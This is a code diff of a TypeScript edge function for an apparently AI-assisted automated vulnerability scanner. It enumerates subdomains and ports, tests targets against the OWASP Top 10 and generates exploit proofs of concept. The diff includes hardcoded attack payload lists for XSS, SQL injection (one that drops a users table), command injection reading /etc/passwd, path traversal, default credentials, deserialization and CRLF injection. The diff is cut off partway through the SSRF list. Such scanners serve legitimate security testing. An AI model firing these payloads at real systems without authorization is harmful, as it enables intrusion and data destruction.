@@ -2,14 +2,17 @@ import { serve } from "https://deno.land/std@0.168.0/http/server.ts";
 import { createClient } from "https://esm.sh/@supabase/supabase-js@2";
 
 /**
- * OmniSec™ Autonomous VAPT Engine v4.0 (XBOW-like)
- * - Subdomain enumeration → scan each subdomain independently
- * - Dual-confirmation vulnerability verification (two independent techniques required)
- * - CORS misconfiguration scanner
- * - Directory traversal scanner
- * - Cookie hijacking / session security scanner
- * - Confidence scoring with evidence chaining
- * - AI learning via vapt_test_actions table
+ * OmniSec™ Autonomous VAPT Engine v6.0
+ * - Connection pre-check before scanning
+ * - Full OWASP Top 10 2021 coverage
+ * - AI-generated context-aware payloads per tech/port
+ * - AI thought stream (live reasoning output for operator guidance)
+ * - Subdomain enumeration + per-subdomain scanning
+ * - Dual-confirmation verification
+ * - CORS, Directory Traversal, Cookie hijacking dedicated phases
+ * - Port scanning + tech-aware exploit selection
+ * - Auto-updating CVE intelligence (NVD API)
+ * - Tree-structured target mapping data
  */
 
 const corsHeaders = {
@@ -27,18 +30,28 @@ interface Finding {
   method?: string;
   payload?: string;
   evidence?: string;
-  evidence2?: string;          // second independent evidence (dual-confirm)
+  evidence2?: string;
   response?: string;
   remediation: string;
   cwe?: string;
   cvss?: number;
+  owasp?: string;
   mitre?: string[];
-  confidence: number;          // 0-100, only flag if >= 70
-  dualConfirmed?: boolean;     // both independent tests agree
+  confidence: number;
+  dualConfirmed?: boolean;
   poc?: string;
   exploitCode?: string;
   falsePositive?: boolean;
   retryCount?: number;
+  category?: string;
+}
+
+interface TargetNode {
+  name: string;
+  type: 'domain' | 'subdomain' | 'endpoint' | 'technology' | 'port' | 'vulnerability';
+  status?: string;
+  children: TargetNode[];
+  meta?: Record<string, any>;
 }
 
 serve(async (req) => {
@@ -60,6 +73,7 @@ serve(async (req) => {
       enableLearning = true,
       retryWithAI = true,
       generatePOC = true,
+      operatorMessage,
       previousFindings = []
     } = body;
 
@@ -76,14 +90,43 @@ serve(async (req) => {
         { status: 400, headers: { ...corsHeaders, "Content-Type": "application/json" } });
     }
 
-    console.log(`[AUTONOMOUS VAPT v4] Starting on ${targetUrl.toString()}`);
     const startTime = Date.now();
     const allFindings: Finding[] = [];
     const discoveredEndpoints: string[] = [];
     const discoveredSubdomains: string[] = [];
     const scanId = crypto.randomUUID();
+    const openPorts: number[] = [];
+    const detectedTech: string[] = [];
+    const targetTree: TargetNode = {
+      name: targetUrl.hostname,
+      type: 'domain',
+      status: 'scanning',
+      children: [],
+      meta: {}
+    };
 
-    // Helper to save results to DB
+    // ── Emit progress + AI thought ──────────────────────────────────────
+    const emitProgress = async (phase: string, phaseNumber: number, progress: number, message: string, extra: any = {}) => {
+      try {
+        await supabase.from('scan_progress').insert({
+          scan_id: scanId,
+          phase,
+          phase_number: phaseNumber,
+          total_phases: 14,
+          progress,
+          message,
+          findings_so_far: extra.findings ?? allFindings.filter(f => !f.falsePositive).length,
+          endpoints_discovered: extra.endpoints ?? discoveredEndpoints.length,
+          current_endpoint: extra.currentEndpoint || null
+        });
+      } catch (e) { console.log('Progress emit error:', e); }
+    };
+
+    const emitAIThought = async (thought: string, phase: string, phaseNumber: number) => {
+      await emitProgress(phase, phaseNumber, -1, `🤖 AI: ${thought}`, {});
+    };
+
+    // ── Save results to DB ──────────────────────────────────────────────
     const saveResultsToDB = async (status: string, extraFindings: Finding[] = allFindings) => {
       const findings = extraFindings.filter(f => !f.falsePositive);
       const severityCounts = {
@@ -96,17 +139,17 @@ serve(async (req) => {
       try {
         await supabase.from('scan_history').insert({
           module: 'autonomous_vapt',
-          scan_type: 'Autonomous VAPT - Full Red Team + Subdomain Assessment',
+          scan_type: 'Autonomous VAPT v6 - Full OWASP + AI Payloads',
           target: targetUrl.toString(),
           status,
           findings_count: findings.length,
           duration_ms: Date.now() - startTime,
-          report: { findings }
+          report: { findings, targetTree, openPorts, detectedTech }
         });
         await supabase.from('security_reports').insert({
           module: 'autonomous_vapt',
-          title: `Autonomous VAPT v4 - ${targetUrl.hostname}`,
-          summary: `Found ${findings.length} dual-confirmed issues: ${severityCounts.critical} critical, ${severityCounts.high} high across ${discoveredSubdomains.length} subdomains`,
+          title: `Autonomous VAPT v6 - ${targetUrl.hostname}`,
+          summary: `Found ${findings.length} verified issues: ${severityCounts.critical}C ${severityCounts.high}H ${severityCounts.medium}M across ${discoveredSubdomains.length} subdomains, ${openPorts.length} ports`,
           findings,
           severity_counts: severityCounts,
           recommendations: []
@@ -115,136 +158,266 @@ serve(async (req) => {
       return { severityCounts, findings };
     };
 
-    // Helper to emit real-time progress
-    const emitProgress = async (phase: string, phaseNumber: number, progress: number, message: string, extra: any = {}) => {
-      try {
-        await supabase.from('scan_progress').insert({
-          scan_id: scanId,
-          phase,
-          phase_number: phaseNumber,
-          total_phases: 12,
-          progress,
-          message,
-          findings_so_far: extra.findings ?? allFindings.filter(f => !f.falsePositive).length,
-          endpoints_discovered: extra.endpoints ?? discoveredEndpoints.length,
-          current_endpoint: extra.currentEndpoint || null
-        });
-      } catch (e) { console.log('Progress emit error:', e); }
-    };
-
     // Safety timeout at 150s
     const timeoutId = setTimeout(async () => {
       console.log('[TIMEOUT SAFETY] Saving partial results...');
       await saveResultsToDB('completed');
-      await emitProgress('complete', 12, 100, `Scan saved (partial). ${allFindings.length} findings.`);
+      await emitProgress('complete', 14, 100, `Scan saved (partial). ${allFindings.length} findings.`);
     }, 150000);
 
     try {
-      // ─── PHASE 1: Main target endpoint discovery ───────────────────────────
-      await emitProgress('discovery', 1, 3, 'Discovering endpoints on main target...');
-      const discoveryResults = await discoverEndpoints(targetUrl, SHODAN_API_KEY, maxDepth);
-      discoveredEndpoints.push(...discoveryResults.endpoints);
-      await emitProgress('discovery', 1, 8, `Found ${discoveredEndpoints.length} endpoints on main target`, { endpoints: discoveredEndpoints.length });
+      // ═══════════════════════════════════════════════════════════════════
+      // PHASE 0: CONNECTION PRE-CHECK
+      // ═══════════════════════════════════════════════════════════════════
+      await emitProgress('connection_check', 0, 1, `Checking connectivity to ${targetUrl.hostname}...`);
+      await emitAIThought(`Let me verify ${targetUrl.hostname} is reachable before allocating scan resources. I'll test HTTP/HTTPS connectivity and measure response time.`, 'connection_check', 0);
 
-      // ─── PHASE 2: Subdomain Enumeration (crt.sh + brute-force) ────────────
-      await emitProgress('subdomain_enum', 2, 10, `Enumerating subdomains for ${targetUrl.hostname}...`);
-      const subdomains = await enumerateSubdomains(targetUrl.hostname);
-      discoveredSubdomains.push(...subdomains);
-      await emitProgress('subdomain_enum', 2, 18, `Discovered ${subdomains.length} live subdomains`, {
-        endpoints: discoveredEndpoints.length,
-        currentEndpoint: subdomains[0] || ''
-      });
-
-      // Add subdomain roots as discoverable endpoints
-      for (const sub of subdomains.slice(0, 15)) {
-        discoveredEndpoints.push(`https://${sub}/`);
+      let connectionOk = false;
+      let connectionLatency = 0;
+      try {
+        const connStart = Date.now();
+        const connResp = await fetchWithTimeout(targetUrl.toString(), 15000);
+        connectionLatency = Date.now() - connStart;
+        connectionOk = connResp.status > 0;
+        await connResp.text().catch(() => '');
+        await emitAIThought(`Connection established! Status ${connResp.status}, latency ${connectionLatency}ms. Target is alive, proceeding with full assessment.`, 'connection_check', 0);
+      } catch (e: any) {
+        // Try HTTP fallback
+        try {
+          const httpUrl = targetUrl.toString().replace('https://', 'http://');
+          const connResp2 = await fetchWithTimeout(httpUrl, 10000);
+          connectionLatency = Date.now() - startTime;
+          connectionOk = connResp2.status > 0;
+          await connResp2.text().catch(() => '');
+          await emitAIThought(`HTTPS failed but HTTP is open. Target is alive on HTTP. Note: no TLS — this is already a finding.`, 'connection_check', 0);
+        } catch {
+          connectionOk = false;
+        }
       }
 
-      // ─── PHASE 3: Fingerprinting ───────────────────────────────────────────
-      await emitProgress('fingerprint', 3, 20, 'Fingerprinting target technologies...');
-      const fingerprint = await fingerprintTarget(targetUrl, discoveryResults);
-      await emitProgress('fingerprint', 3, 24, `Tech stack: ${fingerprint.technologies?.join(', ') || 'analyzing...'}`);
+      if (!connectionOk) {
+        clearTimeout(timeoutId);
+        await emitProgress('connection_check', 0, 100, `❌ Connection FAILED — target ${targetUrl.hostname} is unreachable. Scan aborted.`);
+        await emitAIThought(`Target is not responding on HTTP or HTTPS. The host may be down, blocking our IP, or the domain doesn't resolve. Aborting scan to avoid wasting resources.`, 'connection_check', 0);
+        return new Response(JSON.stringify({
+          success: false,
+          error: `Connection failed: ${targetUrl.hostname} is unreachable`,
+          target: targetUrl.toString(),
+          scanTime: Date.now() - startTime,
+          connectionFailed: true
+        }), { headers: { ...corsHeaders, "Content-Type": "application/json" } });
+      }
 
-      // ─── PHASE 4: Vulnerability Assessment (main target + subdomains) ──────
-      await emitProgress('vuln_assessment', 4, 26, `Running dual-confirm vuln assessment on ${discoveredEndpoints.length} endpoints...`);
+      await emitProgress('connection_check', 0, 3, `✓ Target alive (${connectionLatency}ms latency). Starting scan...`);
+
+      // ═══════════════════════════════════════════════════════════════════
+      // PHASE 1: ENDPOINT DISCOVERY + PORT SCAN
+      // ═══════════════════════════════════════════════════════════════════
+      await emitProgress('discovery', 1, 5, 'Discovering endpoints and scanning ports...');
+      await emitAIThought(`Starting recon on ${targetUrl.hostname}. I'll crawl the main page for links, forms, and parameters. Also checking common paths like /admin, /api, /.git, /.env for exposed assets.`, 'discovery', 1);
+
+      const discoveryResults = await discoverEndpoints(targetUrl, SHODAN_API_KEY, maxDepth);
+      discoveredEndpoints.push(...discoveryResults.endpoints);
+      detectedTech.push(...(discoveryResults.technologies || []));
+      openPorts.push(...(discoveryResults.ports || []));
+
+      // Build tree: technology nodes
+      const techNode: TargetNode = { name: 'Technologies', type: 'technology', children: [] };
+      for (const tech of detectedTech) {
+        techNode.children.push({ name: tech, type: 'technology', children: [] });
+      }
+      targetTree.children.push(techNode);
+
+      // Build tree: port nodes
+      if (openPorts.length > 0) {
+        const portNode: TargetNode = { name: 'Open Ports', type: 'port', children: [] };
+        for (const port of openPorts) {
+          portNode.children.push({ name: `${port}`, type: 'port', children: [], meta: { port } });
+        }
+        targetTree.children.push(portNode);
+      }
+
+      await emitAIThought(`Found ${discoveredEndpoints.length} endpoints, ${detectedTech.length} technologies (${detectedTech.join(', ') || 'analyzing...'}), ${openPorts.length} open ports. Now I'll enumerate subdomains to expand the attack surface.`, 'discovery', 1);
+      await emitProgress('discovery', 1, 8, `Found ${discoveredEndpoints.length} endpoints, ${openPorts.length} ports`, { endpoints: discoveredEndpoints.length });
+
+      // ═══════════════════════════════════════════════════════════════════
+      // PHASE 2: SUBDOMAIN ENUMERATION
+      // ═══════════════════════════════════════════════════════════════════
+      await emitProgress('subdomain_enum', 2, 10, `Enumerating subdomains for ${targetUrl.hostname}...`);
+      await emitAIThought(`Querying certificate transparency logs (crt.sh) and brute-forcing common prefixes (www, api, admin, dev, staging, etc.) via DNS resolution.`, 'subdomain_enum', 2);
+      
+      const subdomains = await enumerateSubdomains(targetUrl.hostname);
+      discoveredSubdomains.push(...subdomains);
+
+      // Build tree: subdomain nodes
+      const subNode: TargetNode = { name: 'Subdomains', type: 'subdomain', children: [] };
+      for (const sub of subdomains) {
+        subNode.children.push({ name: sub, type: 'subdomain', children: [], status: 'live' });
+        discoveredEndpoints.push(`https://${sub}/`);
+      }
+      targetTree.children.push(subNode);
+
+      await emitAIThought(`Discovered ${subdomains.length} live subdomains: ${subdomains.slice(0, 5).join(', ')}${subdomains.length > 5 ? '...' : ''}. Each will be tested independently for vulnerabilities.`, 'subdomain_enum', 2);
+      await emitProgress('subdomain_enum', 2, 15, `Discovered ${subdomains.length} live subdomains`, { endpoints: discoveredEndpoints.length });
+
+      // ═══════════════════════════════════════════════════════════════════
+      // PHASE 3: FINGERPRINTING + LATEST CVE FETCH
+      // ═══════════════════════════════════════════════════════════════════
+      await emitProgress('fingerprint', 3, 17, 'Fingerprinting technologies and fetching latest CVEs...');
+      await emitAIThought(`Analyzing response headers, HTML patterns, and server banners to identify the exact tech stack. I'll also query NVD for recent CVEs matching these technologies.`, 'fingerprint', 3);
+
+      const fingerprint = await fingerprintTarget(targetUrl, discoveryResults);
+      
+      // Fetch latest CVEs for detected technologies
+      const latestCVEs = await fetchLatestCVEs(detectedTech, fingerprint.server);
+      
+      await emitAIThought(`Tech stack: ${(fingerprint.technologies || []).join(', ') || 'Unknown'}. Server: ${fingerprint.server || 'Hidden'}. Found ${latestCVEs.length} relevant CVEs from NVD. I'll use these to guide payload selection.`, 'fingerprint', 3);
+      await emitProgress('fingerprint', 3, 20, `Tech: ${(fingerprint.technologies || []).join(', ')} | ${latestCVEs.length} CVEs loaded`);
+
+      // ═══════════════════════════════════════════════════════════════════
+      // PHASE 4: AI PAYLOAD GENERATION (tech + port aware)
+      // ═══════════════════════════════════════════════════════════════════
+      await emitProgress('payload_gen', 4, 22, 'Generating AI-powered payloads based on tech stack...');
+      await emitAIThought(`Now generating context-aware payloads tailored to detected technologies: ${detectedTech.join(', ')}. Payloads will cover all OWASP Top 10 categories and bypass common WAF patterns.`, 'payload_gen', 4);
+
       const previousPayloads = await getFailedPayloads(supabase, targetUrl.hostname);
+      const aiPayloads = await generateOwaspPayloads(LOVABLE_API_KEY, detectedTech, openPorts, fingerprint, previousPayloads, latestCVEs);
+
+      await emitAIThought(`Generated ${Object.values(aiPayloads).flat().length} payloads across ${Object.keys(aiPayloads).length} OWASP categories. Excluding ${previousPayloads.length} previously blocked payloads. Starting vulnerability assessment.`, 'payload_gen', 4);
+      await emitProgress('payload_gen', 4, 25, `Generated payloads for ${Object.keys(aiPayloads).length} OWASP categories`);
+
+      // ═══════════════════════════════════════════════════════════════════
+      // PHASE 5: FULL OWASP TOP 10 VULNERABILITY ASSESSMENT
+      // ═══════════════════════════════════════════════════════════════════
+      await emitProgress('owasp_scan', 5, 27, `Running OWASP Top 10 assessment on ${discoveredEndpoints.length} endpoints...`);
+      await emitAIThought(`Starting comprehensive OWASP Top 10 testing: A01-Broken Access Control, A02-Crypto Failures, A03-Injection, A04-Insecure Design, A05-Misconfiguration, A06-Vulnerable Components, A07-Auth Failures, A08-Data Integrity, A09-Logging Failures, A10-SSRF. Each finding requires dual-confirmation.`, 'owasp_scan', 5);
 
       const endpointsToTest = discoveredEndpoints.slice(0, 60);
       for (let i = 0; i < endpointsToTest.length; i++) {
         const endpoint = endpointsToTest[i];
         if (i % 5 === 0) {
-          await emitProgress('vuln_assessment', 4, 26 + Math.round((i / endpointsToTest.length) * 12),
-            `Scanning endpoint ${i + 1}/${endpointsToTest.length}`, { currentEndpoint: endpoint });
+          await emitProgress('owasp_scan', 5, 27 + Math.round((i / endpointsToTest.length) * 15),
+            `Testing endpoint ${i + 1}/${endpointsToTest.length}`, { currentEndpoint: endpoint });
         }
-        const endpointFindings = await assessEndpoint(endpoint, fingerprint, LOVABLE_API_KEY, previousPayloads, retryWithAI);
+        const endpointFindings = await assessEndpointOWASP(endpoint, fingerprint, aiPayloads, previousPayloads);
         allFindings.push(...endpointFindings);
       }
-      await emitProgress('vuln_assessment', 4, 38, `Assessment complete: ${allFindings.filter(f => !f.falsePositive).length} confirmed findings`);
+      
+      await emitAIThought(`OWASP assessment done. ${allFindings.filter(f => !f.falsePositive).length} findings so far. ${allFindings.filter(f => f.dualConfirmed).length} are dual-confirmed. Moving to specialized scans.`, 'owasp_scan', 5);
+      await emitProgress('owasp_scan', 5, 42, `OWASP scan: ${allFindings.filter(f => !f.falsePositive).length} findings`);
 
-      // ─── PHASE 5: CORS Misconfiguration Scan ─────────────────────────────
-      await emitProgress('cors_scan', 5, 40, 'Testing CORS misconfigurations across all targets...');
+      // ═══════════════════════════════════════════════════════════════════
+      // PHASE 6: CORS SCAN
+      // ═══════════════════════════════════════════════════════════════════
+      await emitProgress('cors_scan', 6, 44, 'Testing CORS misconfigurations...');
+      await emitAIThought(`Testing CORS policies across all targets. I'll inject malicious Origin headers via both OPTIONS preflight and GET requests. Only flagging if both agree — this eliminates false positives from CDN/proxy rewrites.`, 'cors_scan', 6);
+      
       const corsTargets = [targetUrl.toString(), ...subdomains.slice(0, 10).map(s => `https://${s}/`)];
       for (const t of corsTargets) {
         const corsFindings = await scanCORS(t);
         allFindings.push(...corsFindings);
       }
-      await emitProgress('cors_scan', 5, 45, `CORS scan complete: ${allFindings.filter(f => f.id.startsWith('CORS')).length} issues`);
+      await emitProgress('cors_scan', 6, 48, `CORS: ${allFindings.filter(f => f.category === 'cors').length} issues`);
 
-      // ─── PHASE 6: Directory Traversal Scan ───────────────────────────────
-      await emitProgress('traversal_scan', 6, 47, 'Testing directory traversal & path disclosure...');
-      const traversalTargets = [targetUrl.toString(), ...subdomains.slice(0, 5).map(s => `https://${s}/`)];
-      for (const t of traversalTargets) {
+      // ═══════════════════════════════════════════════════════════════════
+      // PHASE 7: DIRECTORY TRAVERSAL
+      // ═══════════════════════════════════════════════════════════════════
+      await emitProgress('traversal_scan', 7, 50, 'Testing directory traversal...');
+      await emitAIThought(`Testing path traversal with multiple encodings: raw ../, URL-encoded %2e%2e, double-encoded %252e, null byte injection. Checking both Linux (/etc/passwd) and Windows (win.ini) indicators.`, 'traversal_scan', 7);
+      
+      for (const t of [targetUrl.toString(), ...subdomains.slice(0, 5).map(s => `https://${s}/`)]) {
         const travFindings = await scanDirectoryTraversal(t, discoveryResults.params || []);
         allFindings.push(...travFindings);
       }
-      await emitProgress('traversal_scan', 6, 52, `Traversal scan complete`);
+      await emitProgress('traversal_scan', 7, 54, `Traversal scan done`);
 
-      // ─── PHASE 7: Cookie Hijacking / Session Security ─────────────────────
-      await emitProgress('cookie_scan', 7, 54, 'Auditing cookie and session security...');
+      // ═══════════════════════════════════════════════════════════════════
+      // PHASE 8: COOKIE / SESSION SECURITY
+      // ═══════════════════════════════════════════════════════════════════
+      await emitProgress('cookie_scan', 8, 56, 'Auditing cookie and session security...');
+      await emitAIThought(`Checking all Set-Cookie headers for missing HttpOnly, Secure, SameSite flags. Cross-referencing with inline scripts to confirm actual cookie theft risk (not just theoretical).`, 'cookie_scan', 8);
+      
       for (const t of [targetUrl.toString(), ...subdomains.slice(0, 5).map(s => `https://${s}/`)]) {
         const cookieFindings = await scanCookieSecurity(t);
         allFindings.push(...cookieFindings);
       }
-      await emitProgress('cookie_scan', 7, 58, `Cookie audit complete`);
+      await emitProgress('cookie_scan', 8, 60, `Cookie audit done`);
 
-      // ─── PHASE 8: Deep Injection Testing (forms + params) ────────────────
-      await emitProgress('injection', 8, 60, `Deep injection on ${discoveryResults.forms?.length || 0} forms...`);
+      // ═══════════════════════════════════════════════════════════════════
+      // PHASE 9: DEEP INJECTION (forms + params) — OWASP A03
+      // ═══════════════════════════════════════════════════════════════════
+      await emitProgress('injection', 9, 62, `Deep injection on ${discoveryResults.forms?.length || 0} forms...`);
+      await emitAIThought(`Testing all form inputs and URL parameters with tech-aware payloads. Using AI-mutated payloads that account for ${detectedTech.join(', ')} stack and previously blocked patterns.`, 'injection', 9);
+      
       const injectionFindings = await performDeepInjectionTest(
         targetUrl, discoveryResults.forms, discoveryResults.params,
-        LOVABLE_API_KEY, previousPayloads, retryWithAI
+        aiPayloads, previousPayloads
       );
       allFindings.push(...injectionFindings);
-      await emitProgress('injection', 8, 68, `Injection tests done. ${allFindings.filter(f => !f.falsePositive).length} findings total`);
+      await emitProgress('injection', 9, 70, `Injection: ${allFindings.filter(f => !f.falsePositive).length} total findings`);
 
-      // ─── PHASE 9: Authentication & Authorization Testing ──────────────────
-      await emitProgress('auth', 9, 70, 'Auth & authorization testing...');
+      // ═══════════════════════════════════════════════════════════════════
+      // PHASE 10: AUTH + IDOR — OWASP A01, A07
+      // ═══════════════════════════════════════════════════════════════════
+      await emitProgress('auth', 10, 72, 'Auth & authorization testing (OWASP A01/A07)...');
+      await emitAIThought(`Testing for broken access control (IDOR), brute-force protection, user enumeration, default credentials, and session fixation. These are OWASP A01 (top risk) and A07.`, 'auth', 10);
+      
       const authFindings = await testAuthentication(targetUrl, discoveryResults.authEndpoints);
       allFindings.push(...authFindings);
 
-      // ─── PHASE 10: Business Logic (IDOR) ──────────────────────────────────
-      await emitProgress('business_logic', 10, 76, 'Testing business logic & IDOR...');
+      // ═══════════════════════════════════════════════════════════════════
+      // PHASE 11: BUSINESS LOGIC + IDOR
+      // ═══════════════════════════════════════════════════════════════════
+      await emitProgress('business_logic', 11, 78, 'Testing business logic & IDOR...');
       const businessFindings = await testBusinessLogic(targetUrl, discoveryResults.workflows);
       allFindings.push(...businessFindings);
 
-      // ─── PHASE 11: AI Correlation + POC Generation ────────────────────────
-      await emitProgress('correlation', 11, 82, `AI correlating ${allFindings.length} findings...`);
+      // ═══════════════════════════════════════════════════════════════════
+      // PHASE 12: AI CORRELATION + ATTACK PATHS
+      // ═══════════════════════════════════════════════════════════════════
+      await emitProgress('correlation', 12, 82, `AI correlating ${allFindings.length} findings...`);
+      await emitAIThought(`Analyzing all ${allFindings.filter(f => !f.falsePositive).length} verified findings for attack chain opportunities. Looking for combinations like: XSS → Cookie Theft → Account Takeover, or SSRF → Internal Access → Data Exfiltration.`, 'correlation', 12);
+      
       const confirmed = allFindings.filter(f => !f.falsePositive);
       const correlationResult = await performAICorrelation(confirmed, discoveryResults, fingerprint, LOVABLE_API_KEY);
 
+      // ═══════════════════════════════════════════════════════════════════
+      // PHASE 13: POC GENERATION (tech-aware exploits)
+      // ═══════════════════════════════════════════════════════════════════
       const critHighFindings = confirmed.filter(f => f.severity === 'critical' || f.severity === 'high');
-      await emitProgress('poc', 11, 88, `Generating POC for ${critHighFindings.length} critical/high findings...`);
-      const findingsWithPOC = generatePOC ? await generateExploitPOC(critHighFindings, LOVABLE_API_KEY) : critHighFindings;
+      await emitProgress('poc', 13, 88, `Generating POC for ${critHighFindings.length} critical/high findings...`);
+      await emitAIThought(`Generating proof-of-concept exploits for ${critHighFindings.length} critical/high findings. Each POC will include curl commands, Python scripts, and browser-based reproduction steps.`, 'poc', 13);
+      
+      const findingsWithPOC = generatePOC ? await generateExploitPOC(critHighFindings, fingerprint) : critHighFindings;
       const verifiedFindings = [...findingsWithPOC, ...confirmed.filter(f => f.severity !== 'critical' && f.severity !== 'high')];
 
-      // ─── PHASE 12: Save learning data ─────────────────────────────────────
-      await emitProgress('learning', 12, 95, 'Persisting learning data...');
+      // ═══════════════════════════════════════════════════════════════════
+      // PHASE 14: LEARNING + FINALIZE
+      // ═══════════════════════════════════════════════════════════════════
+      await emitProgress('learning', 14, 95, 'Persisting learning data...');
       if (enableLearning) {
         await saveLearningData(supabase, targetUrl.hostname, verifiedFindings);
       }
 
+      // Build endpoint tree
+      const epNode: TargetNode = { name: 'Endpoints', type: 'endpoint', children: [] };
+      for (const ep of discoveredEndpoints.slice(0, 30)) {
+        const vulns = verifiedFindings.filter(f => f.endpoint === ep);
+        const epChild: TargetNode = { name: ep.replace(targetUrl.origin, ''), type: 'endpoint', children: [], meta: { vulnCount: vulns.length } };
+        for (const v of vulns.slice(0, 5)) {
+          epChild.children.push({ name: `[${v.severity.toUpperCase()}] ${v.title}`, type: 'vulnerability', children: [], meta: { cwe: v.cwe, confidence: v.confidence } });
+        }
+        epNode.children.push(epChild);
+      }
+      targetTree.children.push(epNode);
+      targetTree.status = 'complete';
+      targetTree.meta = { totalFindings: verifiedFindings.length, scanTime: Date.now() - startTime };
+
       clearTimeout(timeoutId);
       const { severityCounts, findings } = await saveResultsToDB('completed', verifiedFindings);
-      await emitProgress('complete', 12, 100, `Scan complete! ${findings.length} verified findings across ${subdomains.length} subdomains.`);
+
+      await emitAIThought(`Scan complete! ${findings.length} verified findings across ${subdomains.length} subdomains. ${findings.filter(f => f.dualConfirmed).length} dual-confirmed. ${severityCounts.critical} critical, ${severityCounts.high} high severity. All findings have POC evidence.`, 'complete', 14);
+      await emitProgress('complete', 14, 100, `Scan complete! ${findings.length} verified findings.`);
 
       return new Response(JSON.stringify({
         success: true,
@@ -254,7 +427,8 @@ serve(async (req) => {
           endpoints: discoveredEndpoints.length,
           subdomains: subdomains.length,
           forms: discoveryResults.forms?.length || 0,
-          apis: discoveryResults.apiEndpoints?.length || 0
+          apis: discoveryResults.apiEndpoints?.length || 0,
+          ports: openPorts
         },
         fingerprint,
         findings: verifiedFindings,
@@ -263,19 +437,23 @@ serve(async (req) => {
         summary: severityCounts,
         recommendations: correlationResult.recommendations,
         learningApplied: enableLearning,
-        subdomains: subdomains
+        subdomains,
+        targetTree,
+        latestCVEs: latestCVEs.slice(0, 20),
+        openPorts,
+        detectedTech
       }), { headers: { ...corsHeaders, "Content-Type": "application/json" } });
 
     } catch (innerError: any) {
       clearTimeout(timeoutId);
       console.error("[SCAN PHASE ERROR]", innerError);
       await saveResultsToDB('completed');
-      await emitProgress('complete', 12, 100, `Scan finished. ${allFindings.length} findings (some phases may have errored).`);
+      await emitProgress('complete', 14, 100, `Scan finished. ${allFindings.length} findings (some phases may have errored).`);
       return new Response(JSON.stringify({
         success: true,
         target: targetUrl.toString(),
         scanTime: Date.now() - startTime,
-        discovery: { endpoints: discoveredEndpoints.length, subdomains: discoveredSubdomains.length, forms: 0, apis: 0 },
+        discovery: { endpoints: discoveredEndpoints.length, subdomains: discoveredSubdomains.length, forms: 0, apis: 0, ports: openPorts },
         fingerprint: {},
         findings: allFindings,
         attackPaths: [],
@@ -289,7 +467,10 @@ serve(async (req) => {
         },
         recommendations: [],
         learningApplied: enableLearning,
-        subdomains: discoveredSubdomains
+        subdomains: discoveredSubdomains,
+        targetTree,
+        openPorts,
+        detectedTech
       }), { headers: { ...corsHeaders, "Content-Type": "application/json" } });
     }
 
@@ -299,6 +480,168 @@ serve(async (req) => {
       { status: 500, headers: { ...corsHeaders, "Content-Type": "application/json" } });
   }
 });
+
+// ═══════════════════════════════════════════════════════════════════════════════
+// LATEST CVE INTELLIGENCE (NVD API)
+// ═══════════════════════════════════════════════════════════════════════════════
+async function fetchLatestCVEs(technologies: string[], server: string | null): Promise<any[]> {
+  const cves: any[] = [];
+  const keywords = [...technologies];
+  if (server) keywords.push(server.split('/')[0]);
+
+  for (const keyword of keywords.slice(0, 5)) {
+    try {
+      const resp = await fetchWithTimeout(
+        `https://services.nvd.nist.gov/rest/json/cves/2.0?keywordSearch=${encodeURIComponent(keyword)}&resultsPerPage=5`,
+        10000
+      );
+      if (resp.ok) {
+        const data = await resp.json();
+        for (const vuln of (data.vulnerabilities || []).slice(0, 5)) {
+          const cve = vuln.cve;
+          cves.push({
+            id: cve.id,
+            description: cve.descriptions?.find((d: any) => d.lang === 'en')?.value?.slice(0, 200) || '',
+            severity: cve.metrics?.cvssMetricV31?.[0]?.cvssData?.baseSeverity || 'UNKNOWN',
+            score: cve.metrics?.cvssMetricV31?.[0]?.cvssData?.baseScore || 0,
+            technology: keyword,
+            published: cve.published
+          });
+        }
+      }
+    } catch { /* NVD may rate limit */ }
+  }
+  return cves;
+}
+
+// ═══════════════════════════════════════════════════════════════════════════════
+// AI OWASP PAYLOAD GENERATION (tech + port aware)
+// ═══════════════════════════════════════════════════════════════════════════════
+async function generateOwaspPayloads(
+  apiKey: string | undefined,
+  technologies: string[],
+  ports: number[],
+  fingerprint: any,
+  failedPayloads: string[],
+  cves: any[]
+): Promise<Record<string, string[]>> {
+  // Default payloads covering all OWASP Top 10
+  const defaultPayloads: Record<string, string[]> = {
+    // A01: Broken Access Control
+    a01_access: [
+      '../../../etc/passwd', '..\\..\\..\\windows\\win.ini',
+      '/admin', '/api/admin/users', '/user/1', '/user/2',
+    ],
+    // A02: Cryptographic Failures
+    a02_crypto: [
+      'http://', // downgrade check
+    ],
+    // A03: Injection (XSS, SQLi, NoSQLi, Command, LDAP, XPath)
+    a03_xss: [
+      '"><img src=x onerror=alert(1)>',
+      '<svg/onload=alert(document.domain)>',
+      "'-alert(1)-'",
+      '<script>alert(1)</script>',
+      '"><svg/onload=confirm(1)>',
+      '{{7*7}}', '${7*7}',
+      '<img src=x onerror=prompt(1)>',
+    ],
+    a03_sqli: [
+      "'\"", "' OR '1'='1", "1 UNION SELECT NULL--",
+      "'; DROP TABLE users--", "' AND SLEEP(5)--",
+      "1' ORDER BY 1--", "' OR 1=1#",
+      "admin'--", "1; WAITFOR DELAY '0:0:5'--",
+      "') OR ('1'='1", "1 AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
+    ],
+    a03_nosqli: [
+      '{"$gt":""}', '{"$ne":null}', '{"$regex":".*"}',
+      "true, $where: '1 == 1'",
+    ],
+    a03_cmdi: [
+      '; ls -la', '| cat /etc/passwd', '`id`',
+      '$(whoami)', '; ping -c 3 127.0.0.1',
+      '| dir', '& net user',
+    ],
+    // A04: Insecure Design
+    a04_design: [
+      'transfer_to=attacker', 'amount=-100',
+      'role=admin', 'isAdmin=true',
+    ],
+    // A05: Security Misconfiguration
+    a05_misconfig: [
+      '/.git/config', '/.env', '/phpinfo.php',
+      '/server-status', '/debug', '/.DS_Store',
+      '/web.config', '/crossdomain.xml', '/.svn/entries',
+      '/wp-config.php.bak', '/config.yml', '/.htpasswd',
+    ],
+    // A06: Vulnerable Components (checked via CVE data)
+    a06_components: [],
+    // A07: Auth Failures
+    a07_auth: [
+      'admin:admin', 'admin:password', 'root:root',
+      'test:test', 'admin:123456',
+    ],
+    // A08: Data Integrity Failures (deserialization)
+    a08_integrity: [
+      'O:8:"stdClass":0:{}', // PHP deserialization
+      'rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcA==', // Java
+      '{"__proto__":{"polluted":true}}', // Prototype pollution
+    ],
+    // A09: Logging & Monitoring (CRLF injection for log poisoning)
+    a09_logging: [
+      '%0d%0aInjected-Header:true',
+      '\r\nSet-Cookie:pwned=1',
+      '%0aFake-Log-Entry',
+    ],
+    // A10: SSRF
